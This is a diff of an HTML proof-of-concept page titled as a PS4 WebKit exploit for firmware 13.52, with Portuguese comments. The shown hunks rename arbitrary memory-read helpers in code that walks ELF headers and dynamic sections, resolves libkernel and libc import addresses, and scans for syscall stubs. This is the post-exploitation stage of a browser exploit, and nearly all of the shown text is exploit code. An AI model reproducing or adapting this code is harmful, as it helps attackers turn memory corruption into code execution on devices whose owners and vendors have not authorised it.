@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Notification PoC 2)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -150,10 +151,10 @@ function resolveName(raw) {
 function get_jmptgt(p, addr) {
   try {
     // Padrão comum: FF 25 xx xx xx xx  (jmp qword ptr [rip+disp32])
-    const b0 = p.read8(addr);
-    const b1 = p.read8(addr.add32(1));
+    const b0 = p.read1(addr);
+    const b1 = p.read1(addr.add32(1));
     if (b0 === 0xFF && b1 === 0x25) {
-      const disp = p.read32(addr.add32(2));
+      const disp = p.read4(addr.add32(2));
       // disp é signed
       const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
       const slot = addr.add32(6 + signed);
@@ -161,7 +162,7 @@ function get_jmptgt(p, addr) {
     }
     // JMP rel32: E9 xx xx xx xx
     if (b0 === 0xE9) {
-      const disp = p.read32(addr.add32(1));
+      const disp = p.read4(addr.add32(1));
       const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
       return addr.add32(5 + signed);
     }
@@ -193,7 +194,7 @@ function findElfBase(p, startPtr, maxBack) {
   for (let i = 0; i < pages; i++) {
     try {
       const test = startPtr.sub32((startPtr.low & 0xFFF) + i * 0x1000);
-      const m = p.read32(test);
+      const m = p.read4(test);
       if (m === 0x464C457F) return test;
     } catch (e) {
       // página não mapeada — continua
@@ -216,7 +217,7 @@ async function resolveAllBases(p, webkitBase) {
     log('[*] Lendo magic em 0x' + webkitBase.toString(16) + '...');
     let magic;
     try {
-      magic = p.read32(webkitBase);
+      magic = p.read4(webkitBase);
     } catch (e) {
       log('[-] Falha ao ler magic: ' + e.message, 'e');
       return { imports, libkernelBase, libcBase };
@@ -231,12 +232,12 @@ async function resolveAllBases(p, webkitBase) {
     // e_phoff @ +0x20 (8 bytes), e_phentsize @ +0x36, e_phnum @ +0x38
     let phoffVal = 0, phnum = 0, phentsize = 0x38;
     try {
-      const phoffObj = p.read64(webkitBase.add32(0x20));
+      const phoffObj = p.read8(webkitBase.add32(0x20));
       phoffVal = (typeof phoffObj === 'object' && phoffObj.low !== undefined)
         ? (phoffObj.low >>> 0)
         : (Number(phoffObj) >>> 0);
-      phnum = p.read16(webkitBase.add32(0x38)) & 0xffff;
-      phentsize = p.read16(webkitBase.add32(0x36)) & 0xffff || 0x38;
+      phnum = p.read2(webkitBase.add32(0x38)) & 0xffff;
+      phentsize = p.read2(webkitBase.add32(0x36)) & 0xffff || 0x38;
       log('[+] phoff=0x' + phoffVal.toString(16) + ' phnum=' + phnum + ' phentsize=' + phentsize);
     } catch (e) {
       log('[-] Falha ao ler program headers: ' + e.message, 'e');
@@ -254,14 +255,14 @@ async function resolveAllBases(p, webkitBase) {
     for (let i = 0; i < phnum; i++) {
       try {
         const phAddr = webkitBase.add32(phoffVal + i * phentsize);
-        const p_type = p.read32(phAddr) >>> 0;
+        const p_type = p.read4(phAddr) >>> 0;
         // p_vaddr @ +0x10, p_filesz @ +0x20, p_memsz @ +0x28
         if (p_type === 2 /* PT_DYNAMIC */) {
-          dynamicVaddr = p.read64(phAddr.add32(0x10));
-          const memsz = p.read64(phAddr.add32(0x28));
+          dynamicVaddr = p.read8(phAddr.add32(0x10));
+          const memsz = p.read8(phAddr.add32(0x28));
           dynamicSize = (typeof memsz === 'object' && memsz.low !== undefined) ? (memsz.low >>> 0) : (Number(memsz) >>> 0);
           if (!dynamicSize) {
-            const filesz = p.read64(phAddr.add32(0x20));
+            const filesz = p.read8(phAddr.add32(0x20));
             dynamicSize = (typeof filesz === 'object' && filesz.low !== undefined) ? (filesz.low >>> 0) : (Number(filesz) >>> 0);
           }
           log('[+] PT_DYNAMIC vaddr=0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
@@ -287,10 +288,10 @@ async function resolveAllBases(p, webkitBase) {
     for (let i = 0; i < maxEntries; i++) {
       try {
         const entry = dynamicVaddr.add32(i * 16);
-        const tagObj = p.read64(entry);
+        const tagObj = p.read8(entry);
         const tag = (typeof tagObj === 'object' && tagObj.low !== undefined) ? (tagObj.low >>> 0) : (Number(tagObj) >>> 0);
         if (tag === 0) break;
-        const val = p.read64(entry.add32(8));
+        const val = p.read8(entry.add32(8));
         seenTags.push('0x' + tag.toString(16));
 
         if (tag === 5)  strtab = val;
@@ -332,12 +333,12 @@ async function resolveAllBases(p, webkitBase) {
       for (let i = 0; i < numRela; i++) {
         try {
           const relaEnt = jmprel.add32(i * 24);
-          const r_offset = p.read64(relaEnt);
-          const symIndex = p.read32(relaEnt.add32(12)) >>> 0; // high 32 de r_info
-          const st_name = p.read32(symtab.add32(symIndex * 24)) >>> 0;
+          const r_offset = p.read8(relaEnt);
+          const symIndex = p.read4(relaEnt.add32(12)) >>> 0; // high 32 de r_info
+          const st_name = p.read4(symtab.add32(symIndex * 24)) >>> 0;
           let raw = '';
           for (let j = 0; j < 48; j++) {
-            const ch = p.read8(strtab.add32(st_name + j));
+            const ch = p.read1(strtab.add32(st_name + j));
             if (ch === 0) break;
             if (ch < 32 || ch > 126) { raw = ''; break; }
             raw += String.fromCharCode(ch);
@@ -432,7 +433,7 @@ async function validateBases(p, libkernelBase, libcBase) {
   const valid = { libkernel: false, libc: false };
 
   if (libkernelBase) {
-    const magic = p.read32(libkernelBase);
+    const magic = p.read4(libkernelBase);
     if (magic === 0x464C457F) {
       log('[✓] libkernel: ELF magic válido', 'ok');
       valid.libkernel = true;
@@ -442,7 +443,7 @@ async function validateBases(p, libkernelBase, libcBase) {
   }
 
   if (libcBase) {
-    const magic = p.read32(libcBase);
+    const magic = p.read4(libcBase);
     if (magic === 0x464C457F) {
       log('[✓] libc: ELF magic válido', 'ok');
       valid.libc = true;
@@ -456,13 +457,13 @@ async function validateBases(p, libkernelBase, libcBase) {
     let foundStubs = 0;
     for (let off = 0; off < 0x80000; off += 0x10) {
       try {
-        const b0 = p.read8(libkernelBase.add32(off));
-        const b1 = p.read8(libkernelBase.add32(off + 1));
-        const b2 = p.read8(libkernelBase.add32(off + 2));
+        const b0 = p.read1(libkernelBase.add32(off));
+        const b1 = p.read1(libkernelBase.add32(off + 1));
+        const b2 = p.read1(libkernelBase.add32(off + 2));
         if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
-          const b7 = p.read8(libkernelBase.add32(off + 7));
-          const b8 = p.read8(libkernelBase.add32(off + 8));
-          const b9 = p.read8(libkernelBase.add32(off + 9));
+          const b7 = p.read1(libkernelBase.add32(off + 7));
+          const b8 = p.read1(libkernelBase.add32(off + 8));
+          const b9 = p.read1(libkernelBase.add32(off + 9));
           if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
             foundStubs++;
             if (foundStubs >= 3) break;
@@ -685,4 +686,3 @@ main();
 </script>
 </body>
 </html>
-
